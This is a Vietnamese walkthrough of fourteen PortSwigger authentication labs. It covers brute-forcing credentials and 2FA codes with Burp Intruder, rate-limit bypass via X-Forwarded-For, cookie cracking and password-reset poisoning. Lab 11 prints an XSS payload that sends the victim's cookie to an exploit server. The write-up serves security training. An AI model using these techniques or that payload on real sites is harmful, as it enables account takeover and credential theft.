# Lab 1: Username enumeration via different responses
![image.png](https://hackmd.io/_uploads/r16bjheXa.png)
- Lab này cho danh sách `username` và `password`
    - [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
    - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
- Ta phải tìm ra tài khoản hợp lệ để giải lab

Đầu tiên, thử login với `username: admin, password: 123456` và gửi qua Intruder để xử lý
![image.png](https://hackmd.io/_uploads/SJFMphxQa.png)

Tiếp theo, brute force `username` và `password` bằng danh sách cho trước, attack type `Cluster bomb`
![image.png](https://hackmd.io/_uploads/BywWkpeXa.png)
![image.png](https://hackmd.io/_uploads/HyHiJTeQT.png)
![image.png](https://hackmd.io/_uploads/BkDhkTeQa.png)

Ta thấy mỗi request đều nhận được phản hồi với status 200, ngoại trừ 1 request có status 302. Chứng tỏ lần login đó thành công.
![image.png](https://hackmd.io/_uploads/B1sdZaeQT.png)

Vậy ta có `username: affiliate, password: mom`

![image.png](https://hackmd.io/_uploads/rJ1pZagQT.png)
Done!

# Lab 2: Username enumeration via subtly different responses
![image.png](https://hackmd.io/_uploads/HJpXinxQp.png)
Tương tự lab trên

Đầu tiên, thử login với `username: admin, password: 123456` và gửi qua Intruder để xử lý
![image.png](https://hackmd.io/_uploads/S1XFqRg7a.png)

Tiếp theo, brute force `username` và `password` bằng danh sách cho trước, attack type `Cluster bomb`
![image.png](https://hackmd.io/_uploads/SJAhc0gm6.png)
![image.png](https://hackmd.io/_uploads/ByYp9AxXa.png)
![image.png](https://hackmd.io/_uploads/r1fAqRxm6.png)

Ta thấy mỗi request đều nhận được phản hồi với status 200, ngoại trừ 1 request có status 302. Chứng tỏ lần login đó thành công.
![image.png](https://hackmd.io/_uploads/rkkb6Aem6.png)

Vậy ta có `username: att, password: 000000`

![image.png](https://hackmd.io/_uploads/ry6VpRgmT.png)
Done!

# Lab 3: Username enumeration via response timing
![image.png](https://hackmd.io/_uploads/Sk9Si2gmT.png)
- Làm trễ thời gian phản hồi của web để tìm được tài khoản hợp lệ dựa trên
    - Thông tin đăng nhập: `wiener:peter`
    - [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
    - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

Đầu tiên, thử login với các tài khoản bất kỳ
![image.png](https://hackmd.io/_uploads/Skbkp4G7T.png)
IP của chúng ta sẽ bị chặn do login quá nhiều lần

Để bypass, thêm header `X-Forwarded-For`
![image.png](https://hackmd.io/_uploads/BJ8jTVzQ6.png)
![image.png](https://hackmd.io/_uploads/S1deJBGm6.png)
Thử login với password bất kỳ thì thời gian response của web là gần như nhau 

Giờ ta tăng độ dài password lên thì thấy web response khá lâu 1335ms
![image.png](https://hackmd.io/_uploads/Synt1HGQp.png)

Tận dụng điều này để giải lab
Gửi request qua Intruder, attack type Pitchfork
![image.png](https://hackmd.io/_uploads/HyCilBGQa.png)

Payload 1: từ 1 -> 100 vì có 100 username
![image.png](https://hackmd.io/_uploads/H1cr-BGXp.png)

Payload2: danh sách username lab đã cung cấp
![image.png](https://hackmd.io/_uploads/B1oNbSz76.png)

Ta thấy request 51 có thời gian phản hồi lâu nhất, vậy `username` chính là `al`
![image.png](https://hackmd.io/_uploads/SkBTWSM76.png)

Với username vừa tìm được, tìm password tương ứng
![image.png](https://hackmd.io/_uploads/B1r9MSMQa.png)
![image.png](https://hackmd.io/_uploads/Bk7WQSf7p.png)
![image.png](https://hackmd.io/_uploads/BklZQSfXa.png)

Có 1 response với status 302, còn lại đều là 200
![image.png](https://hackmd.io/_uploads/HkvEXHzmT.png)
Vậy ta có password là `superman`

![image.png](https://hackmd.io/_uploads/ry0_XHfma.png)
Done!

# Lab 4: Broken brute-force protection, IP block
![image.png](https://hackmd.io/_uploads/SJxUdSGXa.png)
- Lab này chứa lỗ hổng do logic trong việc bảo vệ mật khẩu. 
- Mục tiêu lab: brute force password của nạn nhân, sau đó login.
    - Thông tin đăng nhập: `wiener:peter`
    - username của nạn nhân: `carlos`
    - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

Login với tài khoản bất ký, ta thấy nếu nhập sai mật khẩu quá 3 lần thì phải chờ 1 phút mới được login tiếp
![image.png](https://hackmd.io/_uploads/H16uQPMXa.png)

Login tài khoản `wiener:peter` mà lab đã cung cấp
![image.png](https://hackmd.io/_uploads/rJr6mDGQT.png)
Đăng nhập thành công, sau đó logout, ta thấy không phải chờ nữa, mà có thể tiếp tục thử các tài khoản khác
![image.png](https://hackmd.io/_uploads/H1KZVvfm6.png)

Tận dụng lỗ hổng này để giải lab. Gửi request qua Intruder
- Attack tyoe: Pitchfork
- Payload 1: username `wiener` để tránh bị khóa, `carlos` là mục tiêu cần tìm password, sắp xếp chúng xen kẽ nhau
- Payload 2: password tương ứng

![image.png](https://hackmd.io/_uploads/r1oQTDGm6.png)
![image.png](https://hackmd.io/_uploads/rykm6wMXa.png)
![image.png](https://hackmd.io/_uploads/ryP32DGXp.png)

![image.png](https://hackmd.io/_uploads/HkD9pvfm6.png)
Vậy password là `cheese`

![image.png](https://hackmd.io/_uploads/BJuapvzXp.png)
Done!

# Lab 5: Username enumeration via account lock
![image.png](https://hackmd.io/_uploads/BJZ4buGma.png)

Đầu tiên, ta thử login với 50 lần với 1 user
![image.png](https://hackmd.io/_uploads/HkJdMtfmp.png)
![image.png](https://hackmd.io/_uploads/SJcBzKz7p.png)
![image.png](https://hackmd.io/_uploads/rJ-FzYGm6.png)

Nhưng web không báo gì về việc khóa tài khoản
![image.png](https://hackmd.io/_uploads/HJghHFMmp.png)

Giờ ta thử với nhiều username xem có thông báo nào khác không, attack type Cluster bomb
![image.png](https://hackmd.io/_uploads/ry7NItGXa.png)
![image.png](https://hackmd.io/_uploads/rJyEUFMX6.png)
![image.png](https://hackmd.io/_uploads/B12mUYGQT.png)

Ta thấy có 1 username có độ dài khác nhau, tức là login quá 3 lần sẽ bị khóa trong 1 phút
![image.png](https://hackmd.io/_uploads/ByYQDKf7a.png)
Vậy ta có username là `af`

Với username này, tiếp tục tìm password
![image.png](https://hackmd.io/_uploads/rk8LcYMXa.png)
![image.png](https://hackmd.io/_uploads/Hye85YzmT.png)

Thấy 1 response có độ dài khác biệt, tức là không gặp lỗi nào
![image.png](https://hackmd.io/_uploads/H13KcKMQp.png)
Vậy password là `george`

![image.png](https://hackmd.io/_uploads/By4EsYfmp.png)
Done!

# Lab 6: Broken brute-force protection, multiple credentials per request
![image.png](https://hackmd.io/_uploads/ryX_aKzQa.png)

Thử login, ta thấy request ở dạng file JSON
![image.png](https://hackmd.io/_uploads/HJi5AKzXa.png)

Sửa value của password thành 1 mảng các password
```python
f = open(r'D:\General\Portswigger\user.txt')
lines = []

for x in f:
    lines.append("\""+ x.strip() + "\"" + ",") 

output_file_path = 'D:\\General\\Portswigger\\user2.txt'
with open(output_file_path, 'w') as output_file:
    for line in lines:
        output_file.write(line + '\n')
```
![image.png](https://hackmd.io/_uploads/SJINg9zX6.png)

Status 302 tức là thành công
![image.png](https://hackmd.io/_uploads/B1Lcxqf7a.png)

Paste vào browser
![image.png](https://hackmd.io/_uploads/HJ_2lcG7a.png)
Done!

# Lab 7: 2FA simple bypass
![image.png](https://hackmd.io/_uploads/HyEAZcz7T.png)

Login vào tài khoản `wiener: peter`, web chuyển đến `/login2`
![image.png](https://hackmd.io/_uploads/HJRZI14X6.png)

Lấy code xác thực từ email
![image.png](https://hackmd.io/_uploads/HyxdLyVmT.png)
Sau khi login thành công, web chuyển hướng đến `/my-account`
URL hiện tại là 
```
https://0a58008204a6b6138375af4d002900f8.web-security-academy.net/my-account?id=wiener
```
Giờ đổi id thành `carlos` thì bị logout ra. Nhập tài khoản `carlos: montoya` mà lab cung cấp thì web chuyển đến `/login2`

Sửa URL thành chuyển hướng đến `/my-account` xem sao
![image.png](https://hackmd.io/_uploads/SysLDkEQa.png)
Done!

# Lab 8: 2FA broken logic
![image.png](https://hackmd.io/_uploads/B1lgO1NmT.png)

Đầu tiên, login với `wiener: peter` xem sao
![image.png](https://hackmd.io/_uploads/r1iXnJNXT.png)
Web yêu cầu xác thực yếu tố thứ 2 với mã xác thực gồm 4 chữ số

Ở `/login2` ta thấy cookie có `verify=wiener`
![image.png](https://hackmd.io/_uploads/B13Y6yNXT.png)

Nếu đổi thành `verify=carlos` thì sao
![image.png](https://hackmd.io/_uploads/ryUFpJ4m6.png)
Hệ thống cho ta nhảy đến bước xác thực thứ 2 mà không cần nhập mật khẩu

Giờ thì đi brute force mật khẩu thuiii
- Attack type: Sniper
- Payload: 0 -> 9999 (vì mã xác thực gồm 4 chữ số)

![image.png](https://hackmd.io/_uploads/B10o1eEm6.png)
![image.png](https://hackmd.io/_uploads/ByPC1eN7T.png)

Tìm được mã xác thực là `1245`
![image.png](https://hackmd.io/_uploads/HkO5kZNmp.png)

Chọn `Request in browser` và paste url trên trình duyệt
![image.png](https://hackmd.io/_uploads/BkMmgWEX6.png)
Done!

# Lab 9: 2FA bypass using a brute-force attack
![image.png](https://hackmd.io/_uploads/H1lzdJVQT.png)

Đầu tiên, login với `carlos: montoya`, khi nhập sai mã xác thực 2 lần thì tự động logout ra
![image.png](https://hackmd.io/_uploads/B1gLJAH7T.png)

Ta sẽ dùng Burp macros để xử lý phiên, nó giúp ta login với tư cách là `carlos` sau mỗi lần thử mã xác thực
![image.png](https://hackmd.io/_uploads/rJ2L70SXT.png)
![image.png](https://hackmd.io/_uploads/rkTDXCrQ6.png)
![image.png](https://hackmd.io/_uploads/ByxZNRH7a.png)
![image.png](https://hackmd.io/_uploads/ryDf4Rrma.png)

Chọn `Test macro`, nếu response yêu cầu nhập mã xác thực tức là macro hoạt động đúng
![image.png](https://hackmd.io/_uploads/SkuQw0S7T.png)

Tiếp theo, gửi `POST /login2` qua Intruder để brute-force mã xác thực
![image.png](https://hackmd.io/_uploads/S1_kSCBQ6.png)
![image.png](https://hackmd.io/_uploads/SknxH0HQp.png)
![image.png](https://hackmd.io/_uploads/rJdN_Rrma.png)

Vì chỉ gửi 1 request 1 lần nên chờ siêu lâu

Trả về status 302 tức là mã đúng
![image.png](https://hackmd.io/_uploads/SyfcNqLmT.png)
![image.png](https://hackmd.io/_uploads/B1m3NqL7a.png)
Done!

# Lab 10: Brute-forcing a stay-logged-in cookie
![image.png](https://hackmd.io/_uploads/HkmvfkLXp.png)

Thử login với `wiener: peter` lab đã cung cấp, chọn `stay logged in`

Login thành công, ngay cả khi ta đóng trình duyệt thì vẫn không bị logout

Vì cookie này được lưu trữ cho phiên đăng nhập tiếp theo
![image.png](https://hackmd.io/_uploads/HJHxBMLQa.png)

Decode thì thấy cookie này dưới dạng `wiener:51dc30ddc473d43a6011e9ebba6ca770`
![image.png](https://hackmd.io/_uploads/SyRzSMLXp.png)

Lại thấy `51dc30ddc473d43a6011e9ebba6ca770` có dạng MD5 hash (có 32 ký tự, bao gồm a-z0-9)
![image.png](https://hackmd.io/_uploads/ry8BIMLmT.png)
Sau khi decode nhận được đúng password ban đầu.

Vậy password được lưu trữ dưới dạng `base64(username:md5(password))`

Giờ gửi qua Intruder và brute-force mật khẩu với username `carlos`
![image.png](https://hackmd.io/_uploads/Hk0O1mL7T.png)
![image.png](https://hackmd.io/_uploads/ryrkAGIQT.png)
![image.png](https://hackmd.io/_uploads/rJq-RMIX6.png)

Tìm thấy cookie đã được mã hóa, solved lab
![image.png](https://hackmd.io/_uploads/S1Rs-XIm6.png)
Done!

# Lab 11: Offline password cracking
![image.png](https://hackmd.io/_uploads/HJR9f1Ima.png)
- Lab này lưu trữ hàm băm mật khẩu trong cookie và chứa lỗ hổng XSS trong chức năng bình luận. 
- Mục tiêu lab: login với `carlos` và xóa tài khoản này

Tương tự lab trên, cookie được mã hóa dạng `base64(username:md5(password))`
![image.png](https://hackmd.io/_uploads/H1XN-OI76.png)
![image.png](https://hackmd.io/_uploads/H1trW_Imp.png)

Tiếp theo, vào phần comment để kiểm tra
![image.png](https://hackmd.io/_uploads/BJK57_UQp.png)

Lỗ hổng XSS
![image.png](https://hackmd.io/_uploads/SkqiQOU76.png)

Payload XSS sau để khai thác
```js
<script>document.location='https://exploit-0a3300e8031720ed80210c9301ea0058.exploit-server.net/exploit'+document.cookie</script>

```
![image.png](https://hackmd.io/_uploads/BkNzLuLXp.png)

Chọn access log để xem nhật ký truy cập
![image.png](https://hackmd.io/_uploads/Bk-uLu8mp.png)
Ta thấy có 1 `stay logged in` đã được mã hóa

Decode thì được đúng dạng cookie
![image.png](https://hackmd.io/_uploads/B1qRLOIm6.png)
![image.png](https://hackmd.io/_uploads/SyZtDu8mT.png)
Vậy password là `onceuponatime`

Tiếp theo, login và delete account `carlos`
![image.png](https://hackmd.io/_uploads/S1NbuuLm6.png)
Done!

# Lab 12: Password reset broken logic
![image.png](https://hackmd.io/_uploads/By8azyUmT.png)

Login với `wiener: peter` mà lab cung cấp, chọn chức năng Forgor password
![image.png](https://hackmd.io/_uploads/S1jj6OUma.png)
Hệ thống yêu cầu kiểm tra email

Mail cung cấp 1 URL để reset password
![image.png](https://hackmd.io/_uploads/HkqpTOI76.png)
![image.png](https://hackmd.io/_uploads/SJSO0u8mT.png)

Ta có request `POST /forgot-password?temp-forgot-password-token`
![image.png](https://hackmd.io/_uploads/SJpbxFIXT.png)

Nếu xóa `temp-forgot-password-token` thì chức năng reset vẫn hoạt động, chứng tỏ hệ thống không kiểm tra lại token sau đặt lại mật khẩu mới
![image.png](https://hackmd.io/_uploads/SkZ6xYIQT.png)

Đổi username thành `carlos` và gửi request
![image.png](https://hackmd.io/_uploads/HJqfeKLXp.png)

Login với mật khẩu trên
![image.png](https://hackmd.io/_uploads/ry2ayK8Xp.png)
Done!

# Lab 13: Password reset poisoning via middleware
![image.png](https://hackmd.io/_uploads/B17JXkLQp.png)
Lab cho phép reset lại mật khẩu bằng cách gửi URL có chứa token qua email
Tận dụng điều này, ta sẽ chặn request ở bước gửi URL này
![image.png](https://hackmd.io/_uploads/r1BDVKI7p.png)

Sử dụng header `X-Forwarded-Host` để chuyển đường link này đến 1 domain khác và với username `carlos`
![image.png](https://hackmd.io/_uploads/B1DnwtUmp.png)

Trong access log ta thấy có 1 địa chỉ IP lạ kèm `temp-forgot-password-token`
![image.png](https://hackmd.io/_uploads/H1MKLVP7T.png)

Ta sẽ lấy cắp token này để reset mật khẩu cho `carlos`
![image.png](https://hackmd.io/_uploads/BJFCIVwXa.png)
![image.png](https://hackmd.io/_uploads/S1aevEDQT.png)

Login với mật khẩu vừa đổi
![image.png](https://hackmd.io/_uploads/HJQGDNwQa.png)
Done!

# Lab 14: Password brute-force via password change
![image.png](https://hackmd.io/_uploads/ByplmkI7a.png)
Lab này chứa lỗ hổng ở chức năng đổi mật khẩu.Login với tài khoản lab cung cấp để phân tích chức năng này

Đầu tiên, nhập sai password hiện tại thì xảy ra 2 trường hợp
- 2 pass mới trùng nhau, acc sẽ bị khóa 
![image.png](https://hackmd.io/_uploads/HykSt4D76.png)
- 2 pass mới khác nhau, hệ thống báo sai pass hiện tại
![image.png](https://hackmd.io/_uploads/ry-ecEvQT.png)

Nếu nhập đúng password hiện tại, 2 pass mới khác nhau, hệ thống báo 2 pass mới không khớp
![image.png](https://hackmd.io/_uploads/By4Y9VvXa.png)

Vì vậy, ta sẽ dựa vào các thông báo này để brute-force mật khẩu của `carlos`

Gửi qua Intruder, ta sẽ đặt 2 pass mới khác nhau, vì nếu pass hiện tại đúng thì trả về `New passwords do not match`
![image.png](https://hackmd.io/_uploads/SkXV24DXT.png)
![image.png](https://hackmd.io/_uploads/HJs334D7a.png)
![image.png](https://hackmd.io/_uploads/BJcA24Dmp.png)

Tìm thấy request khớp với yêu cầu
![image.png](https://hackmd.io/_uploads/B1kb6EP76.png)
Vậy password là `1qaz2wsx`

![image.png](https://hackmd.io/_uploads/rknIaEvXa.png)
Done!
